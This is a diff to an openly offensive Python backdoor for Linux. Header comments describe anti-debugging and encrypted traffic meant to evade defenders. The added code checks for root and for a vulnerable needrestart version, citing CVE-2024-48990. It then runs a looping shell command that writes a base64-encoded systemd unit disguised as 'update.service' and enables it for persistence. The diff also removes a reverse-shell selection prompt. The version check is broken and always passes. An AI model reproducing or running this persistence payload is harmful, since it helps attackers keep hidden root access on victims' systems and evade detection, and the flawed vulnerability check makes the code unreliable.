@@ -4,6 +4,7 @@
 # analyzes processes running debugger and thus terminates the backdoor, allows external payload or the backdoor itself so the attacker has more options to use, not only depending on the payload created by the backdoor,
 #after that it encrypts the communication in order to avoid discoveries in the network by sysadmin,blue team. in the future I will implement new features, such as porting to golang.
 
+
 import os
 import sys
 from urllib.request import urlretrieve
@@ -55,8 +56,25 @@ def internal_backdoor_linux():
             print(f"[@] SHELL IN MACHINE TARGET => {shell_1337}")
     print("-------------------------------------------------")
 
-    choice_reverse_shell = input("[1337] Choice a Reverse Shell For Persistence Name! (example: busybox) => ")
-    hide_process = {'/usr/bin/mount', '/usr/bin/mount'}
+    if os.getuid() == 0:
+        print("[!] YOU ARE ROOT Checking target machine is vulnerable needrestart version 3.7")
+        check_version_needrestart = os.system("needrestart --version | grep 3.7 | cut -d ' ' -f1,2")
+        if str(check_version_needrestart).split("3.7"):
+            choice_cve = input("[!] VERSION IS VULNERABLE DO YOU WANT IMPLEMENT THIS? <(For more information CVE-2024-48990)> y/n -> ")
+            if choice_cve == "y":
+                print("[1337] IMPLEMENT PERSISTENCE!")
+                Payload = "while true; do sleep 3; echo 'W1VuaXRdCkRlc2NyaXB0aW9uPVVwZGF0ZSBTeXN0ZW0KCltTZXJ2aWNlXQpUeXBlPXNpbXBsZQpFeGVjU3RhcnQ9L2Jpbi9iYXNoIC1jICJuZWVkcmVzdGFydCIKUmVzdGFydD1hbHdheXMKUmVzdGFydFNlYz01CgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQK' | base64 -d > /etc/systemd/system/update.service; systemctl enable update && systemctl start update && systemctl daemon-reload; sleep 10; done &"
+                os.system(Payload)
+            elif choice_cve == "n":
+                print("[!] YOU ARE NOT WANT IMPLEMENT THIS PERSISTENCE")
+            else:
+                print("TRY AGAIN y/n 7w7")
+        else:
+            print("[!] TARGET MACHINE NOT VULNERABILITY VERSION NEEDRESTART :(")
+    else:
+            print("YOU ARE NOT ROOT!")
+            sys.exit(1)
+    print("-------------------------------------------------")
 
 
 
